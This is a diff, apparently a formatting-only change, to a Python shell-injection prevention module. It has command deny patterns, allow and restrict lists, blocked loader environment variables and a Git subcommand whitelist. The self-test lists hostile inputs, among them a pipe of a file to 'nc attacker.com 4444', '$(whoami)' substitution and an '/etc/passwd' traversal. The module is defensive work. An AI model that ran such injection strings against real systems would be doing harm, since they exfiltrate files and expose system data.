@@ -17,27 +17,52 @@ class ShellInjectionPrevention:
     def __init__(self):
         # Dangerous characters that could enable injection
         self.dangerous_patterns = [
-            r'[;&|`$()]',  # Command separators and substitution
-            r'[<>]',       # Redirection operators
-            r'\*\*',       # Globbing patterns
-            r'\.\./',      # Directory traversal
-            r'rm\s+-rf',   # Dangerous rm commands
-            r'sudo\s+',    # Privilege escalation
-            r'chmod\s+',   # Permission changes
-            r'chown\s+',   # Ownership changes
+            r"[;&|`$()]",  # Command separators and substitution
+            r"[<>]",  # Redirection operators
+            r"\*\*",  # Globbing patterns
+            r"\.\./",  # Directory traversal
+            r"rm\s+-rf",  # Dangerous rm commands
+            r"sudo\s+",  # Privilege escalation
+            r"chmod\s+",  # Permission changes
+            r"chown\s+",  # Ownership changes
         ]
 
         # Allowed commands whitelist
         self.allowed_commands = {
-            'git', 'ls', 'cat', 'grep', 'find', 'head', 'tail',
-            'wc', 'sort', 'uniq', 'cut', 'awk', 'sed', 'python3',
-            'pip', 'npm', 'node', 'docker', 'kubectl'
+            "git",
+            "ls",
+            "cat",
+            "grep",
+            "find",
+            "head",
+            "tail",
+            "wc",
+            "sort",
+            "uniq",
+            "cut",
+            "awk",
+            "sed",
+            "python3",
+            "pip",
+            "npm",
+            "node",
+            "docker",
+            "kubectl",
         }
 
         # Commands that require special handling
         self.restricted_commands = {
-            'rm', 'mv', 'cp', 'chmod', 'chown', 'sudo', 'su',
-            'systemctl', 'service', 'kill', 'killall'
+            "rm",
+            "mv",
+            "cp",
+            "chmod",
+            "chown",
+            "sudo",
+            "su",
+            "systemctl",
+            "service",
+            "kill",
+            "killall",
         }
 
     def sanitize_command_args(self, args: list[str]) -> list[str]:
@@ -68,7 +93,7 @@ class ShellInjectionPrevention:
             raise ValueError(f"Restricted command not allowed: {base_command}")
 
         # Check if command is in allowed list (if whitelist is enforced)
-        if hasattr(self, 'enforce_whitelist') and self.enforce_whitelist:
+        if hasattr(self, "enforce_whitelist") and self.enforce_whitelist:
             if base_command not in self.allowed_commands:
                 raise ValueError(f"Command not in allowed list: {base_command}")
 
@@ -80,7 +105,9 @@ class ShellInjectionPrevention:
 
         return True
 
-    def safe_subprocess_run(self, command: str | list[str], **kwargs) -> subprocess.CompletedProcess:
+    def safe_subprocess_run(
+        self, command: str | list[str], **kwargs
+    ) -> subprocess.CompletedProcess:
         """Safely execute subprocess with injection prevention"""
 
         # Convert string command to list if needed
@@ -108,17 +135,17 @@ class ShellInjectionPrevention:
 
         # Set secure defaults
         secure_kwargs = {
-            'shell': False,  # Never use shell=True
-            'capture_output': True,
-            'text': True,
-            'timeout': kwargs.get('timeout', 30),  # Default timeout
-            'cwd': kwargs.get('cwd'),
-            'env': self._get_secure_env(kwargs.get('env'))
+            "shell": False,  # Never use shell=True
+            "capture_output": True,
+            "text": True,
+            "timeout": kwargs.get("timeout", 30),  # Default timeout
+            "cwd": kwargs.get("cwd"),
+            "env": self._get_secure_env(kwargs.get("env")),
         }
 
         # Override with user kwargs (but not shell)
         for key, value in kwargs.items():
-            if key != 'shell':  # Never allow shell=True
+            if key != "shell":  # Never allow shell=True
                 secure_kwargs[key] = value
 
         try:
@@ -140,10 +167,10 @@ class ShellInjectionPrevention:
         """Get secure environment variables"""
         # Start with minimal secure environment
         secure_env = {
-            'PATH': '/usr/local/bin:/usr/bin:/bin',
-            'HOME': os.path.expanduser('~'),
-            'USER': os.getenv('USER', 'unknown'),
-            'LANG': 'en_US.UTF-8'
+            "PATH": "/usr/local/bin:/usr/bin:/bin",
+            "HOME": os.path.expanduser("~"),
+            "USER": os.getenv("USER", "unknown"),
+            "LANG": "en_US.UTF-8",
         }
 
         # Add user environment variables (with validation)
@@ -158,7 +185,7 @@ class ShellInjectionPrevention:
     def _is_safe_env_var(self, key: str, value: str) -> bool:
         """Check if environment variable is safe"""
         # Validate key
-        if not re.match(r'^[A-Z_][A-Z0-9_]*$', key):
+        if not re.match(r"^[A-Z_][A-Z0-9_]*$", key):
             return False
 
         # Check for dangerous values
@@ -166,11 +193,12 @@ class ShellInjectionPrevention:
             return False
 
         # Block dangerous environment variables
-        dangerous_env_vars = {'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES'}
+        dangerous_env_vars = {"LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES"}
         if key in dangerous_env_vars:
             return False
 
         return True
+
 
 class GitCommandSanitizer(ShellInjectionPrevention):
     """Specialized sanitizer for Git commands"""
@@ -178,12 +206,28 @@ class GitCommandSanitizer(ShellInjectionPrevention):
     def __init__(self):
         super().__init__()
         self.allowed_git_commands = {
-            'status', 'log', 'diff', 'show', 'branch', 'tag',
-            'add', 'commit', 'push', 'pull', 'fetch', 'clone',
-            'checkout', 'merge', 'rebase', 'reset', 'stash'
+            "status",
+            "log",
+            "diff",
+            "show",
+            "branch",
+            "tag",
+            "add",
+            "commit",
+            "push",
+            "pull",
+            "fetch",
+            "clone",
+            "checkout",
+            "merge",
+            "rebase",
+            "reset",
+            "stash",
         }
 
-    def safe_git_command(self, git_args: list[str], **kwargs) -> subprocess.CompletedProcess:
+    def safe_git_command(
+        self, git_args: list[str], **kwargs
+    ) -> subprocess.CompletedProcess:
         """Execute git command safely"""
         if not git_args:
             raise ValueError("No git command specified")
@@ -194,13 +238,15 @@ class GitCommandSanitizer(ShellInjectionPrevention):
             raise ValueError(f"Git subcommand not allowed: {git_subcommand}")
 
         # Build full command
-        full_command = ['git'] + git_args
+        full_command = ["git"] + git_args
 
         return self.safe_subprocess_run(full_command, **kwargs)
+
 
 # Global instances
 _shell_prevention = None
 _git_sanitizer = None
+
 
 def get_shell_prevention() -> ShellInjectionPrevention:
     """Get global shell injection prevention instance"""
@@ -209,6 +255,7 @@ def get_shell_prevention() -> ShellInjectionPrevention:
         _shell_prevention = ShellInjectionPrevention()
     return _shell_prevention
 
+
 def get_git_sanitizer() -> GitCommandSanitizer:
     """Get global git command sanitizer instance"""
     global _git_sanitizer
@@ -216,15 +263,18 @@ def get_git_sanitizer() -> GitCommandSanitizer:
         _git_sanitizer = GitCommandSanitizer()
     return _git_sanitizer
 
+
 def safe_run_command(command: str | list[str], **kwargs) -> subprocess.CompletedProcess:
     """Convenience function for safe command execution"""
     prevention = get_shell_prevention()
     return prevention.safe_subprocess_run(command, **kwargs)
 
+
 def safe_git_command(git_args: list[str], **kwargs) -> subprocess.CompletedProcess:
     """Convenience function for safe git commands"""
     sanitizer = get_git_sanitizer()
     return sanitizer.safe_git_command(git_args, **kwargs)
+
 
 # Test function
 def test_shell_injection_prevention():
@@ -238,7 +288,7 @@ def test_shell_injection_prevention():
         "file.txt | nc attacker.com 4444",
         "$(whoami)",
         "`id`",
-        "../../../etc/passwd"
+        "../../../etc/passwd",
     ]
 
     print("Testing dangerous pattern detection:")
@@ -250,11 +300,7 @@ def test_shell_injection_prevention():
             print(f"PASSED: Detected dangerous input: {dangerous_input}")
 
     # Test safe commands
-    safe_commands = [
-        ["ls", "-la"],
-        ["git", "status"],
-        ["python3", "--version"]
-    ]
+    safe_commands = [["ls", "-la"], ["git", "status"], ["python3", "--version"]]
 
     print("\nTesting safe commands:")
     for command in safe_commands:
@@ -263,6 +309,7 @@ def test_shell_injection_prevention():
             print(f"PASSED: Safe command executed: {command}")
         except Exception as e:
             print(f"FAILED: Safe command rejected: {command} - {e}")
+
 
 if __name__ == "__main__":
     test_shell_injection_prevention()
